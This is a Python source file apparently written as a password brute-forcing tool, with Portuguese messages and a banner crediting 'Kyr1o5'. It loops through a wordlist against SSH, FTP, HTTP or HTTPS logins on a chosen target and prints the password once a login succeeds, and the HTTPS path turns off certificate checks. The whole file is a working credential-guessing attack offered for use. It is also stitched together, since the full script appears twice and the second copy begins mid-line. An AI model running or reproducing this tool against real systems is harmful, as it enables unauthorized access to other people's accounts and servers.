import os
import socket
import argparse
import requests
import paramiko
from ftplib import FTP

requests.packages.urllib3.disable_warnings()

def SSH(word_user, word_pass, target):
    host = target
    port = 22
    user = word_user
    passwd = word_pass

    client_ssh = paramiko.SSHClient()
    client_ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client_ssh.connect(hostname=host, port=port, username=user, password=passwd)
        print(f'Senha correta encontrada: {passwd}')
        return passwd
    except paramiko.AuthenticationException:
        print(f'Senha incorreta: {passwd}')
        return None
    except Exception as e:
        print(f'Erro ao conectar-se ao servidor SSH: {e}')
        return None

def FTP_con(target, word_user, passwd):
    try:
        ftp = FTP(target)

        ftp.login(user=word_user, passwd=passwd)
        print(f'Senha correta encontrada: {passwd}')
        return passwd
    except TimeoutError:
        print("Erro: Tempo de conexão expirado.")
        return None
    except ConnectionRefusedError:
        print("Erro: Conexão recusada pelo servidor.")
        return None
    except Exception as e:
        print(f"Erro ao conectar-se ao servidor FTP: {e}")
        return None

def HTTP_con(target, word_user, passwd, error_messages,success_message):
    url = target  
    
    data = {
        'uname': word_user,
        'pass': passwd
    }

    try:
        response = requests.post(url, data=data)
        
        print(f"HTTP Status Code: {response.status_code}")  # Para debug

        if success_message in response.text:
            print(f'Senha correta encontrada: {passwd}')
            return passwd
        else:
            print(f'Senha incorreta: {passwd}')
            return None

    except requests.Timeout:
        print("Erro: Tempo de conexão expirado.")
        return None

    except requests.ConnectionError as ce:
        if "Connection refused" in str(ce):
            print("Erro: Conexão recusada pelo servidor.")
            return None
        else:
            print(f"Erro de conexão: {ce}")
            return None

    except Exception as e:
        print(f"Erro durante a solicitação HTTP: {e}")
        return None










def HTTPS_con(target, word_user, passwd, error_messages,success_message):
    url = target

    data = {
        'username': word_user,
        'password': passwd
    }

    try:
        response = requests.post(url, data=data, verify=False)
        
        if any(error_msg in response.text for error_msg in error_messages):
            print(f'Senha incorreta: {passwd}')
            return None
        else:
            print(f'Senha correta encontrada: {passwd}')
            return passwd
    except requests.Timeout:
        print("Erro: Tempo de conexão expirado.")
        return None
    except requests.ConnectionError:
        print("Erro: Conexão recusada pelo servidor.")
        return None
    except Exception as e:
        print(f"Erro durante a solicitação HTTPS: {e}")
        return None

def main():
    print('''
           ___                 _                       
          /___\_ __ ___  _ __ (_)_ __ ___   __ _ _ __  
         //  // '_ ` _ \| '_ \| | '_ ` _ \ / _` | '_ \ 
        / \_//| | | | | | | | | | | | | | | (_| | | | |
        \___/ |_| |_| |_|_| |_|_|_| |_| |_|\__,_|_| |_|
          by:Kyr1o5                                             

        ''')

    parser = argparse.ArgumentParser(description='Script que irá despedaçar barreiras')
    parser.add_argument('-u', '--user', required=True, help='usuario')
    parser.add_argument('-p', '--password', required=True, help='lista de senhas')
    parser.add_argument('-d', '--dns', required=True, help='Ip/dominio do alvo')
    parser.add_argument('-s', '--service', required=True, help='Tipo do serviço (ssh, ftp, http)')
    parser.add_argument('-e', '--error', required=False, help='Mensagem de erro no login')
    parser.add_argument('-sm', '--sucess', required=False, help='Mensagem de sucesso no login')

    args = parser.parse_args()

    word_user = args.user
    word_pass = args.password
    target = args.dns
    service = args.service
    mensagem = args.error
    sucess = args.sucess

    if service == 'ssh':
        with open(word_pass, 'rb') as arquivo_pass:
            for passwd in arquivo_pass:
                passwd = passwd.strip()
                resultado = SSH(word_user, passwd, target)
                if resultado:
                    break
    elif service == 'ftp':
        with open(word_pass, 'rb') as arquivo_pass:
            for passwd in arquivo_pass:
                passwd = passwd.strip()
                resultado = FTP_con(target, word_user, passwd)
                if resultado:
                    break
    elif service == 'http':
	    error_messages = [mensagem]
	    success_message = sucess 
	    with open(word_pass, 'r') as arquivo_pass:
	        for passwd in arquivo_pass:
	            passwd = passwd.strip()
	            resultado = HTTP_con(target, word_user, passwd, error_messages,success_message)
	            if resultado:
	                break


    elif service == 'https':
        error_messages = [mensagem]  # Convertendo a mensagem de erro para uma lista de strings
        success_message = sucess 
        with open(word_pass, 'r') as arquivo_pass:
            for passwd in arquivo_pass:
                passwd = passwd.strip()
                resultado = HTTPS_con(target, word_user, passwd, error_messages, success_message)
                if resultado:
                    break

if __name__ == '__main__':
    main()import os
import socket
import argparse
import requests
import paramiko
from ftplib import FTP

requests.packages.urllib3.disable_warnings()

def SSH(word_user, word_pass, target):
    host = target
    port = 22
    user = word_user
    passwd = word_pass

    client_ssh = paramiko.SSHClient()
    client_ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client_ssh.connect(hostname=host, port=port, username=user, password=passwd)
        print(f'Senha correta encontrada: {passwd}')
        return passwd
    except paramiko.AuthenticationException:
        print(f'Senha incorreta: {passwd}')
        return None
    except Exception as e:
        print(f'Erro ao conectar-se ao servidor SSH: {e}')
        return None

def FTP_con(target, word_user, passwd):
    try:
        ftp = FTP(target)

        ftp.login(user=word_user, passwd=passwd)
        print(f'Senha correta encontrada: {passwd}')
        return passwd
    except TimeoutError:
        print("Erro: Tempo de conexão expirado.")
        return None
    except ConnectionRefusedError:
        print("Erro: Conexão recusada pelo servidor.")
        return None
    except Exception as e:
        print(f"Erro ao conectar-se ao servidor FTP: {e}")
        return None

def HTTP_con(target, word_user, passwd, error_messages,success_message):
    url = target  
    
    data = {
        'uname': word_user,
        'pass': passwd
    }

    try:
        response = requests.post(url, data=data)
        
        print(f"HTTP Status Code: {response.status_code}")  # Para debug

        if success_message in response.text:
            print(f'Senha correta encontrada: {passwd}')
            return passwd
        else:
            print(f'Senha incorreta: {passwd}')
            return None

    except requests.Timeout:
        print("Erro: Tempo de conexão expirado.")
        return None

    except requests.ConnectionError as ce:
        if "Connection refused" in str(ce):
            print("Erro: Conexão recusada pelo servidor.")
            return None
        else:
            print(f"Erro de conexão: {ce}")
            return None

    except Exception as e:
        print(f"Erro durante a solicitação HTTP: {e}")
        return None










def HTTPS_con(target, word_user, passwd, error_messages,success_message):
    url = target

    data = {
        'username': word_user,
        'password': passwd
    }

    try:
        response = requests.post(url, data=data, verify=False)
        
        if any(error_msg in response.text for error_msg in error_messages):
            print(f'Senha incorreta: {passwd}')
            return None
        else:
            print(f'Senha correta encontrada: {passwd}')
            return passwd
    except requests.Timeout:
        print("Erro: Tempo de conexão expirado.")
        return None
    except requests.ConnectionError:
        print("Erro: Conexão recusada pelo servidor.")
        return None
    except Exception as e:
        print(f"Erro durante a solicitação HTTPS: {e}")
        return None

def main():
    print('''
           ___                 _                       
          /___\_ __ ___  _ __ (_)_ __ ___   __ _ _ __  
         //  // '_ ` _ \| '_ \| | '_ ` _ \ / _` | '_ \ 
        / \_//| | | | | | | | | | | | | | | (_| | | | |
        \___/ |_| |_| |_|_| |_|_|_| |_| |_|\__,_|_| |_|
          by:Kyr1o5                                             

        ''')

    parser = argparse.ArgumentParser(description='Script que irá despedaçar barreiras')
    parser.add_argument('-u', '--user', required=True, help='usuario')
    parser.add_argument('-p', '--password', required=True, help='lista de senhas')
    parser.add_argument('-d', '--dns', required=True, help='Ip/dominio do alvo')
    parser.add_argument('-s', '--service', required=True, help='Tipo do serviço (ssh, ftp, http)')
    parser.add_argument('-e', '--error', required=False, help='Mensagem de erro no login')
    parser.add_argument('-sm', '--sucess', required=False, help='Mensagem de sucesso no login')

    args = parser.parse_args()

    word_user = args.user
    word_pass = args.password
    target = args.dns
    service = args.service
    mensagem = args.error
    sucess = args.sucess

    if service == 'ssh':
        with open(word_pass, 'rb') as arquivo_pass:
            for passwd in arquivo_pass:
                passwd = passwd.strip()
                resultado = SSH(word_user, passwd, target)
                if resultado:
                    break
    elif service == 'ftp':
        with open(word_pass, 'rb') as arquivo_pass:
            for passwd in arquivo_pass:
                passwd = passwd.strip()
                resultado = FTP_con(target, word_user, passwd)
                if resultado:
                    break
    elif service == 'http':
	    error_messages = [mensagem]
	    success_message = sucess 
	    with open(word_pass, 'r') as arquivo_pass:
	        for passwd in arquivo_pass:
	            passwd = passwd.strip()
	            resultado = HTTP_con(target, word_user, passwd, error_messages,success_message)
	            if resultado:
	                break


    elif service == 'https':
        error_messages = [mensagem]  # Convertendo a mensagem de erro para uma lista de strings
        success_message = sucess 
        with open(word_pass, 'r') as arquivo_pass:
            for passwd in arquivo_pass:
                passwd = passwd.strip()
                resultado = HTTPS_con(target, word_user, passwd, error_messages, success_message)
                if resultado:
                    break

if __name__ == '__main__':
    main()
